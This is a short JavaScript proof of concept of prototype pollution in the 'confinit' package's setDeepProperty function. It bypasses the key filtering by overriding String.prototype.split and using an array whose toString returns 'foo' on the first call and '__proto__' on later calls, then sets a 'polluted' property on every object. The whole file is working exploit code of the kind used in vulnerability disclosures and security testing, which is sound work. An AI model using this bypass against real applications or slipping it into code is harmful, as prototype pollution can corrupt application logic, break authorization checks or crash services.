var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const root = require('confinit');
const payload = 'constructor.prototype.polluted';
console.log({}.polluted);
root.setDeepProperty({}, payload, 'yes');
console.log({}.polluted);